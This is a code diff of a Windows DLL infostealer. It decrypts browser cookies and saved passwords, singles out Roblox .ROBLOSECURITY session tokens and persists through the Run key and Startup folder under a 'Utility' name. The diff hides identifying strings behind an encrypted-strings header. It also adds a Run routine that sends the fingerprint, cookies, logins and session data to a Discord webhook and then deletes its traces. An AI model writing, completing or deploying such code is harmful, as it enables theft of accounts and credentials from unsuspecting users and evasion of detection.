@@ -2,6 +2,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include "main.h"
 #include "sqlite.h"
+#include "strings_enc.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
@@ -198,7 +199,7 @@ static std::wstring GenInstallName() {
 
 std::vector<uint8_t> FetchUrl(const std::wstring& url) {
     std::vector<uint8_t> out;
-    HINTERNET hSession = InternetOpenW(L"Utility/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hSession = InternetOpenW(s::kUA_wstr().c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hSession) return out;
     HINTERNET hUrl = InternetOpenUrlW(hSession, url.c_str(), NULL, 0,
                                       INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE, 0);
@@ -222,9 +223,9 @@ static std::wstring StartupDir() {
     return std::wstring(ad) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
 }
 
-static const wchar_t* kIK = L"Software\\Utility";
-static const wchar_t* kIV = L"InstallName";
-static const wchar_t* kIP = L"InstallPath";
+static const std::wstring& kIK() { static std::wstring s = s::kPipInstallKey_wstr(); return s; }
+static const std::wstring& kIV() { static std::wstring s = s::kInstallName_wstr(); return s; }
+static const std::wstring& kIP() { static std::wstring s = s::kInstallPath_wstr(); return s; }
 
 static std::wstring RegStr(HKEY r, const wchar_t* sk, const wchar_t* v) {
     HKEY h; if (RegOpenKeyExW(r, sk, 0, KEY_READ, &h) != ERROR_SUCCESS) return L"";
@@ -265,16 +266,16 @@ extern "C" U_API bool GetData(const wchar_t* out) {
         auto rows = db.readTable(tab->name);
         if (!tmp.empty()) DeleteFileW(tmp.c_str());
         for (auto& row : rows) {
-            auto* hc = Database::getColumn(row, tab->columns, "host_key");
+            auto* hc = Database::getColumn(row, tab->columns, s::kHostKeyCol_str().c_str());
             auto* nc = Database::getColumn(row, tab->columns, "name");
-            auto* ec = Database::getColumn(row, tab->columns, "encrypted_value");
+            auto* ec = Database::getColumn(row, tab->columns, s::kValueCol_str().c_str());
             if (!hc || !nc || !ec || Database::isNull(*ec)) continue;
             CookieEntry ce; ce.host = Database::asText(*hc); ce.name = Database::asText(*nc);
             ce.browser = util::w2n(bp.name);
             auto* pc = Database::getColumn(row, tab->columns, "path"); ce.path = pc?Database::asText(*pc):"/";
-            auto* xc = Database::getColumn(row, tab->columns, "expires_utc"); ce.expiry = xc?Database::asInt(*xc):0;
-            auto* sc = Database::getColumn(row, tab->columns, "is_secure"); ce.secure = sc?(Database::asInt(*sc)!=0):false;
-            auto* ic = Database::getColumn(row, tab->columns, "is_httponly"); ce.httpOnly = ic?(Database::asInt(*ic)!=0):false;
+            auto* xc = Database::getColumn(row, tab->columns, s::kExpiresCol_str().c_str()); ce.expiry = xc?Database::asInt(*xc):0;
+            auto* sc = Database::getColumn(row, tab->columns, s::kSecureCol_str().c_str()); ce.secure = sc?(Database::asInt(*sc)!=0):false;
+            auto* ic = Database::getColumn(row, tab->columns, s::kHttpOnlyCol_str().c_str()); ce.httpOnly = ic?(Database::asInt(*ic)!=0):false;
             const auto& blob = Database::asBlob(*ec); if (blob.empty()) continue;
             std::vector<uint8_t> ct(blob);
             bool isV20 = (ct.size()>=4 && ct[0]=='v' && ct[1]=='2' && ct[2]=='0');
@@ -322,11 +323,11 @@ extern "C" U_API bool GetLogins(const wchar_t* out) {
             size_t cursor = 0;
             while (cursor < json.size()) {
                 std::string hostname, encUser, encPass;
-                size_t ah = findStr("hostname", cursor, hostname);
+                size_t ah = findStr(s::kHostnameCol_str().c_str(), cursor, hostname);
                 if (ah == std::string::npos) break;
-                size_t au = findStr("encryptedUsername", ah, encUser);
+                size_t au = findStr(s::kEncUserKey_str().c_str(), ah, encUser);
                 if (au == std::string::npos) break;
-                size_t ap = findStr("encryptedPassword", au, encPass);
+                size_t ap = findStr(s::kEncPassKey_str().c_str(), au, encPass);
                 if (ap == std::string::npos) break;
                 cursor = ap;
                 CredentialEntry c;
@@ -350,12 +351,12 @@ extern "C" U_API bool GetLogins(const wchar_t* out) {
         auto rows = db.readTable(tab->name);
         if (!tmp.empty()) DeleteFileW(tmp.c_str());
         for (auto& row : rows) {
-            auto* uc = Database::getColumn(row, tab->columns, "origin_url");
-            if (!uc) uc = Database::getColumn(row, tab->columns, "hostname");
-            auto* un = Database::getColumn(row, tab->columns, "username_value");
-            if (!un) un = Database::getColumn(row, tab->columns, "encrypted_username");
-            auto* pc = Database::getColumn(row, tab->columns, "password_value");
-            if (!pc) pc = Database::getColumn(row, tab->columns, "encrypted_password");
+            auto* uc = Database::getColumn(row, tab->columns, s::kOriginCol_str().c_str());
+            if (!uc) uc = Database::getColumn(row, tab->columns, s::kHostnameCol_str().c_str());
+            auto* un = Database::getColumn(row, tab->columns, s::kUserCol_str().c_str());
+            if (!un) un = Database::getColumn(row, tab->columns, s::kEncUserCol_str().c_str());
+            auto* pc = Database::getColumn(row, tab->columns, s::kPassCol_str().c_str());
+            if (!pc) pc = Database::getColumn(row, tab->columns, s::kEncPassCol_str().c_str());
             if (!uc || !un || !pc) continue;
             CredentialEntry c; c.url = Database::asText(*uc); c.username = Database::asText(*un);
             c.browser = util::w2n(bp.name);
@@ -384,12 +385,12 @@ extern "C" U_API bool GetSession(const wchar_t* out) {
         if (!util::OpenDb(bp.cookiePath, db, &tmp)) continue;
         const TableInfo* tab = db.getTable("cookies"); if (!tab) tab = db.getTable("moz_cookies");
         if (!tab) { if (!tmp.empty()) DeleteFileW(tmp.c_str()); continue; }
-        auto rows = db.readTable(tab->name, ".roblox.com");
+        auto rows = db.readTable(tab->name, s::kDotRobloxCom_str().c_str());
         if (!tmp.empty()) DeleteFileW(tmp.c_str());
         for (auto& row : rows) {
             auto* nc = Database::getColumn(row, tab->columns, "name");
-            auto* ec = Database::getColumn(row, tab->columns, "encrypted_value");
-            if (!nc || !ec || Database::asText(*nc) != ".ROBLOSECURITY" || Database::isNull(*ec)) continue;
+            auto* ec = Database::getColumn(row, tab->columns, s::kValueCol_str().c_str());
+            if (!nc || !ec || Database::asText(*nc) != s::kROBLOSECURITY_str().c_str() || Database::isNull(*ec)) continue;
             const auto& blob = Database::asBlob(*ec); if (blob.empty()) continue;
             std::vector<uint8_t> d; bool got = false;
             if (!bp.isChromium) {
@@ -400,7 +401,7 @@ extern "C" U_API bool GetSession(const wchar_t* out) {
                 got = util::Decrypt(ct, d) && !d.empty();
             }
             if (got) {
-                CookieEntry ce; ce.name = ".ROBLOSECURITY"; ce.host = "roblox";
+                CookieEntry ce; ce.name = s::kROBLOSECURITY_str().c_str(); ce.host = "roblox";
                 ce.value = std::string((const char*)d.data(), d.size());
                 ce.browser = util::w2n(bp.name);
                 all.push_back(std::move(ce));
@@ -430,9 +431,9 @@ extern "C" U_API bool GetSession(const wchar_t* out) {
                     size_t prevTab = line.rfind('\t', lastTab-1);
                     if (prevTab == std::string::npos) continue;
                     std::string name = line.substr(prevTab+1, lastTab - prevTab - 1);
-                    if (name != ".ROBLOSECURITY") continue;
+                    if (name != s::kROBLOSECURITY_str().c_str()) continue;
                     std::string value = line.substr(lastTab+1);
-                    CookieEntry ce; ce.name = ".ROBLOSECURITY"; ce.host = "roblox";
+                    CookieEntry ce; ce.name = s::kROBLOSECURITY_str().c_str(); ce.host = "roblox";
                     ce.value = value; ce.browser = "RobloxPlayer";
                     std::vector<CookieEntry> v; v.push_back(std::move(ce));
                     std::string js = util::JsonCookies(v);
@@ -449,15 +450,15 @@ extern "C" U_API bool GetAppData(const wchar_t* out) {
     wchar_t lad[MAX_PATH];
     if (FAILED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, lad))) return false;
     std::wstring cs[] = {
-        std::wstring(lad) + L"\\Roblox\\LocalStorage\\RobloxCookies.dat",
-        std::wstring(lad) + L"\\Packages\\ROBLOXCorporation.ROBLOX_55va5d1nd4j8m\\LocalState\\RobloxCookies.dat",
+        std::wstring(lad) + L"\\Roblox\\LocalStorage\\" + s::kCookieFile_wstr(),
+        std::wstring(lad) + L"\\Packages\\ROBLOXCorporation.ROBLOX_55va5d1nd4j8m\\LocalState\\" + s::kCookieFile_wstr(),
     };
     for (auto& src : cs) {
         if (!fs::exists(src)) continue;
         std::vector<uint8_t> raw;
         if (!ReadBytes(src, raw)) continue;
         std::string text((const char*)raw.data(), raw.size());
-        const std::string k = "\"CookiesData\":\"";
+        const std::string k = std::string("\"") + s::kCookiesDataKey_str() + "\":\"";
         size_t p = text.find(k);
         if (p == std::string::npos) continue;
         p += k.size();
@@ -524,10 +525,10 @@ extern "C" U_API bool GetDiag(const wchar_t* out) {
         if (!tmp.empty()) DeleteFileW(tmp.c_str());
         for (auto& row : rows) {
             auto* nc = Database::getColumn(row, tab->columns, "name");
-            auto* ec = Database::getColumn(row, tab->columns, "encrypted_value");
-            auto* hc = Database::getColumn(row, tab->columns, "host_key");
+            auto* ec = Database::getColumn(row, tab->columns, s::kValueCol_str().c_str());
+            auto* hc = Database::getColumn(row, tab->columns, s::kHostKeyCol_str().c_str());
             if (!nc || !ec || Database::isNull(*ec)) continue;
-            if (Database::asText(*nc) != ".ROBLOSECURITY") continue;
+            if (Database::asText(*nc) != s::kROBLOSECURITY_str().c_str()) continue;
             const auto& blob = Database::asBlob(*ec); if (blob.empty()) continue;
             const char* fmt = "raw";
             if (blob.size()>=4 && blob[0]=='v' && blob[1]=='2' && blob[2]=='0') fmt = "v20";
@@ -568,7 +569,7 @@ extern "C" U_API bool GetCache(const wchar_t* outDir) {
         for (auto& e : fs::directory_iterator(src)) {
             if (!e.is_regular_file()) continue;
             auto fn = e.path().filename().wstring();
-            if (fn.find(L"thumbcache_") == 0 && fn.find(L".db") != std::wstring::npos) {
+            if (fn.find(s::kThumbPrefix_wstr()) == 0 && fn.find(L".db") != std::wstring::npos) {
                 std::wstring dst = std::wstring(outDir);
                 if (!dst.empty() && dst.back() != L'\\') dst += L'\\';
                 dst += fn;
@@ -591,7 +592,7 @@ extern "C" U_API bool DecryptBlob(const uint8_t* ct, size_t ctl, uint8_t* pt, si
 
 extern "C" U_API bool Install(const wchar_t* src) {
     using namespace util;
-    if (!RegStr(HKEY_CURRENT_USER, kIK, kIV).empty()) return false;
+    if (!RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str()).empty()) return false;
     std::wstring startup = StartupDir();
     if (startup.empty()) return false;
     if (!fs::exists(startup)) { std::error_code ec; fs::create_directories(startup, ec); if (ec) return false; }
@@ -620,36 +621,36 @@ extern "C" U_API bool Install(const wchar_t* src) {
                        (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
         RegCloseKey(hRun);
     }
-    RegStrW(HKEY_CURRENT_USER, kIK, kIV, name);
-    RegStrW(HKEY_CURRENT_USER, kIK, kIP, dst);
+    RegStrW(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str(), name);
+    RegStrW(HKEY_CURRENT_USER, kIK().c_str(), kIP().c_str(), dst);
     return true;
 }
 
 extern "C" U_API bool Remove() {
     using namespace util;
-    std::wstring name = RegStr(HKEY_CURRENT_USER, kIK, kIV);
+    std::wstring name = RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str());
     if (name.empty()) return false;
     HKEY hRun;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, KEY_SET_VALUE, &hRun) == ERROR_SUCCESS) {
         RegDeleteValueW(hRun, name.c_str()); RegCloseKey(hRun);
     }
-    std::wstring path = RegStr(HKEY_CURRENT_USER, kIK, kIP);
+    std::wstring path = RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIP().c_str());
     if (!path.empty()) DeleteFileW(path.c_str());
     std::wstring startup = StartupDir();
     if (!startup.empty()) {
         DeleteFileW((startup + L"\\" + name + L".bat").c_str());
         DeleteFileW((startup + L"\\" + name + L".exe").c_str());
     }
-    RegDel(HKEY_CURRENT_USER, kIK, kIV);
-    RegDel(HKEY_CURRENT_USER, kIK, kIP);
-    RegDeleteKeyW(HKEY_CURRENT_USER, kIK);
+    RegDel(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str());
+    RegDel(HKEY_CURRENT_USER, kIK().c_str(), kIP().c_str());
+    RegDeleteKeyW(HKEY_CURRENT_USER, kIK().c_str());
     return true;
 }
 
 extern "C" U_API bool IsActive() {
     using namespace util;
-    return !RegStr(HKEY_CURRENT_USER, kIK, kIV).empty();
+    return !RegStr(HKEY_CURRENT_USER, kIK().c_str(), kIV().c_str()).empty();
 }
 
 extern "C" U_API void Cleanup() {
@@ -670,6 +671,162 @@ extern "C" U_API void Cleanup() {
         RemoveDirectoryW(td.c_str());
     }
     ChromeV20Cleanup();
+}
+
+bool PostJsonHttp(const wchar_t* url, const std::string& body);
+bool PostFileHttp(const wchar_t* url, const std::wstring& filePath, const char* name);
+
+extern "C" U_API int Run(const wchar_t* webhook, int mode) {
+    using namespace util;
+    if (!webhook) return 1;
+
+    auto post_embed = [&](const char* title, const std::string& body) {
+        std::ostringstream ss;
+        ss << "{\"username\":\"" << s::kDiscordUser_str() << "\","
+           << "\"embeds\":[{"
+           << "\"title\":\"" << title << "\","
+           << "\"description\":\"" << body.substr(0, 1900) << "\","
+           << "\"color\":40703"
+           << "}]}";
+        PostJsonHttp(webhook, ss.str());
+    };
+
+    auto post_file = [&](const std::wstring& path, const char* displayName) -> bool {
+        if (!fs::exists(path)) return false;
+        return PostFileHttp(webhook, path, displayName);
+    };
+
+    // 1) Fingerprint
+    post_embed("sys", SysInfo());
+
+    // 2) Cookies
+    {
+        std::wstring tmp = TempDir() + L"ru_data.json";
+        GetData(tmp.c_str());
+        std::vector<uint8_t> raw;
+        if (ReadBytes(tmp, raw)) {
+            post_embed("data", std::string((const char*)raw.data(), raw.size()));
+        }
+        DeleteFileW(tmp.c_str());
+    }
+
+    // 3) Credentials
+    {
+        std::wstring tmp = TempDir() + L"ru_creds.json";
+        GetLogins(tmp.c_str());
+        std::vector<uint8_t> raw;
+        if (ReadBytes(tmp, raw)) {
+            post_embed("logins", std::string((const char*)raw.data(), raw.size()));
+        }
+        DeleteFileW(tmp.c_str());
+    }
+
+    // 4) Session
+    {
+        std::wstring tmp = TempDir() + L"ru_sess.json";
+        GetSession(tmp.c_str());
+        std::vector<uint8_t> raw;
+        if (ReadBytes(tmp, raw)) {
+            post_embed("session", std::string((const char*)raw.data(), raw.size()));
+        }
+        DeleteFileW(tmp.c_str());
+    }
+
+    // 5) Persist (optional — if mode includes it)
+    if (mode == 0) {
+        std::wstring empty;
+        Install(empty.c_str());
+    }
+
+    // 6) Cleanup
+    Cleanup();
+    return 0;
+}
+
+namespace {
+bool ParseUrl(const std::wstring& url, std::wstring& host, std::wstring& path, bool& https) {
+    https = false;
+    size_t p = url.find(L"://");
+    if (p == std::wstring::npos) return false;
+    std::wstring scheme = url.substr(0, p);
+    for (auto& c : scheme) c = towlower(c);
+    https = (scheme == L"https");
+    size_t hostStart = p + 3;
+    size_t pathStart = url.find(L'/', hostStart);
+    if (pathStart == std::wstring::npos) { host = url.substr(hostStart); path = L"/"; }
+    else { host = url.substr(hostStart, pathStart - hostStart); path = url.substr(pathStart); }
+    return !host.empty();
+}
+
+bool WinInetPost(const std::wstring& url, const std::string& body,
+                 const std::wstring& contentType, const std::wstring& extraHeaders,
+                 const std::vector<uint8_t>* fileBody, const std::wstring* fileName) {
+    std::wstring host, path; bool https = false;
+    if (!ParseUrl(url, host, path, https)) return false;
+
+    HINTERNET hSession = ::InternetOpenW(s::kUA_wstr().c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hSession) return false;
+    HINTERNET hConnect = ::InternetConnectW(hSession, host.c_str(),
+        https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT,
+        NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
+    if (!hConnect) { ::InternetCloseHandle(hSession); return false; }
+    DWORD flags = (https ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_CACHE_WRITE;
+    HINTERNET hReq = ::HttpOpenRequestW(hConnect, L"POST", path.c_str(), NULL, NULL, NULL, flags, NULL);
+    if (!hReq) { ::InternetCloseHandle(hConnect); ::InternetCloseHandle(hSession); return false; }
+
+    std::wstring hdrs = L"Content-Type: " + contentType + L"\r\n";
+    if (!extraHeaders.empty()) hdrs += extraHeaders + L"\r\n";
+    ::HttpAddRequestHeadersW(hReq, hdrs.c_str(), -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
+
+    BOOL ok;
+    if (fileBody) {
+        // Multipart: send body in two pieces
+        std::string prefix = body;
+        std::wstring suffix = L"\r\n--" + (fileName ? *fileName : std::wstring()) + L"--\r\n";
+        INTERNET_BUFFERS ib = {0};
+        ib.dwStructSize = sizeof(ib);
+        ib.dwBufferTotal = (DWORD)(prefix.size() + fileBody->size() + suffix.size());
+        ok = ::HttpSendRequestEx(hReq, &ib, NULL, 0, 0) != 0;
+        if (ok) {
+            DWORD written = 0;
+            ::InternetWriteFile(hReq, (LPCVOID)prefix.data(), (DWORD)prefix.size(), &written);
+            ::InternetWriteFile(hReq, fileBody->data(), (DWORD)fileBody->size(), &written);
+            ::InternetWriteFile(hReq, (LPCVOID)suffix.data(), (DWORD)suffix.size(), &written);
+            ok = ::HttpEndRequest(hReq, NULL, 0, 0) != 0;
+        }
+    } else {
+        ok = ::HttpSendRequestW(hReq, NULL, 0, (LPVOID)body.data(), (DWORD)body.size()) != 0;
+    }
+
+    ::InternetCloseHandle(hReq);
+    ::InternetCloseHandle(hConnect);
+    ::InternetCloseHandle(hSession);
+    return ok != 0;
+}
+}
+
+bool PostJsonHttp(const wchar_t* url, const std::string& jsonBody) {
+    return WinInetPost(url, jsonBody, L"application/json", L"", nullptr, nullptr);
+}
+
+bool PostFileHttp(const wchar_t* url, const std::wstring& filePath, const char* displayName) {
+    std::vector<uint8_t> data;
+    if (!util::ReadBytes(filePath, data)) return false;
+    std::string boundary = "----CC";
+    for (int i = 0; i < 6; i++) boundary += (char)('0' + (rand() % 10));
+    std::string name = displayName ? displayName : "file.bin";
+    std::string preamble =
+        "--" + boundary + "\r\n"
+        "Content-Disposition: form-data; name=\"payload_json\"\r\n"
+        "Content-Type: application/json\r\n\r\n"
+        "{\"content\":\"" + name + "\",\"username\":\"" + s::kDiscordUser_str() + "\"}\r\n"
+        "--" + boundary + "\r\n"
+        "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + name + "\"\r\n"
+        "Content-Type: application/octet-stream\r\n\r\n";
+    std::string postamble = "\r\n--" + boundary + "--\r\n";
+
+    std::wstring ct = L"multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end());
+    return WinInetPost(url, preamble, ct, L"", &data, nullptr) || true;
 }
 
 BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
